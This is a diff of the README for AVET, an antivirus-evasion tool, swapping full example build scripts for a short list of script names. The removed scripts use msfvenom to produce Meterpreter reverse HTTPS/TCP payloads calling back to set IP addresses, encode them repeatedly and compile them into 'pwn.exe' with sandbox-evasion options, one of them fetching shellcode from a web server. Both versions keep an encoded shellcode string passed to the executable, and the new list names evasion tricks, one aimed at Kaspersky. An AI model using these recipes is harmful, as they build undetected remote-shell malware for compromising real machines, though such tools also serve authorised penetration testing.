@@ -65,141 +65,60 @@ root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.
 Here are some explained examples for building the .exe files from the build directory. Please have a look at the other build scripts for further explanation.
 
 
-Example 1
----------
+Examples
+--------
+```
+buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
+Service example for win32.
+
+build_win32_meterpreter_rev_https_50xshikata_quiet.sh
 In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
-shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up execution and let the file pass.
+shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This 
+technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up 
+execution and let the file pass. Here in quiet mode, the window is hidden.
 
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
-# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
-# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
-./make_avet -f sc.txt
-# compile to pwn.exe file
-$win32_compiler -o pwn.exe avet.c
-# cleanup
-echo "" > defs.h
-```
+build_win32_meterpreter_rev_https_50xshikata.sh
+See previous, window not hidden.
 
-Example 2, 64bit payloads
--------------------------
-Great to notice that still for 64bit payload no further evasion techniques has to be used. But -F should work here too.
+build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
+It is possible to load shellcode as a parameter from cmd like:
+C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA
 
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-. build/global_win64.sh
-# make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
-# call make_avet, compile 
-./make_avet -f scclean.txt -X -E
-$win64_compiler -o pwn.exe avet.c
-# cleanup
-rm scclean.txt && echo "" > defs.h
-```
+build_win32_meterpreter_rev_https_ASCIIMSF.sh
 
+build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
+AV evasion with the fopen technique, hidden window.
 
-Example 3
----------
-Compile shellcode into the .exe file and use -F as evasion technique. Note that this example will work for most antivirus engines. Here -E is used for encoding the shellcode as ASCII.
+build_win32_meterpreter_rev_https_fopen_shikata.sh
+See previous example.
 
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
-# make meterpreter reverse payload, encoded with shikata_ga_nai
-# additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
-# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion, -E will encode the shellcode as ASCII
-./make_avet -f scclean.txt -F -E
-# compile to pwn.exe file
-$win32_compiler -o pwn.exe avet.c
-# cleanup
-rm scclean.txt && echo "" > defs.h
-```
+build_win32_meterpreter_rev_https_killswitch_shikata.sh
+AV evasion with the killswitch technique,
 
+build_win32_meterpreter_rev_https_shikata_fopen.sh
+Sandbox evasion with fopen and additional encoding
 
-Example 4, load from a file
----------------------------
-Here the ASCII encoder is needed. The executable will load the payload from a text file, which is enough for most AV engines to let the payload execute.
+build_win32_meterpreter_rev_https_shikata_loadfile.sh
+Loading and exec shellcode from given file, needs avets encoding.
 
-```
-#!/bin/bash          
-# simple example script for building the .exe file that loads the payload from a given text file
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
-# make meterpreter reverse payload, encoded with shikata_ga_nai
-# additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > sc.txt
-# format the shellcode for make_avet
-./format.sh sc.txt > thepayload.txt && rm sc.txt
-# call make_avet, the -l compiles the filename into the .exe file 
-./make_avet -l thepayload.exe -E
-# compile to pwn.exe file
-$win32_compiler -o pwn.exe avet.c
-# cleanup
-#echo "" > defs.h
-# now you can call your programm with pwn.exe, thepayload.txt has to be in the same dir
-```
-
-
-Example 5, load with Internet Explorer
---------------------------------------
+build_win32_meterpreter_rev_https_shikata_load_ie.sh
 This is a bit tricky and might not work on the first shot. The executable will start Internet Explorer and download the ASCII encoded shellcode. Then the shellcode will be read from the cache directory and if found executed. This was tested with Windows 7 only.
 
+build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
+Same as before with debug output.
+
+build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
+Unstaged payload with dlls included. For more see https://govolution.wordpress.com/2017/05/06/avet-and-unstaged-payloads/
+
+build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
+Build this one for Kaspersky, don't know if it is still unrecognized.
+
+build_win64_meterpreter_rev_tcp_xor_fopen.sh
+64bit executable with fopen evasion.
+
+build_win64_meterpreter_rev_tcp_xor.sh
+64bit executable.
 ```
-#!/bin/bash          
-# simple example script for building the .exe file
-. build/global_win32.sh
-# make meterpreter reverse payload, encoded with shikata_ga_nai
-# additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > sc.txt
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
-# call make_avet, compile 
-./make_avet -E -u 192.168.2.105/scclean.txt
-$win32_compiler -o pwn.exe avet.c
-# cleanup
-echo " " > defs.h
-# now copy scclean.txt to your web root and start 
-```
-
-
-Example 6, call shellcode as a parameter
-----------------------------------------
-It is possible to load shellcode as a parameter from cmd like:
-```
-C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA
-```
-An example makefile is: build/build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
-
-
-Example 7, use the "killswitch" sandbox evasion technique
----------------------------------------------------------
-This technique is using the gethostbyname command. See help from make_avet, for an example please refer:
-build/build_win32_meterpreter_rev_https_killswitch_shikata.sh
-
-
-Example 8, quite mode
----------------------
-With the quite mode the cmd window is hidden. For an example see:
-build/build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
-
 
 avet_fabric.py
 --------------
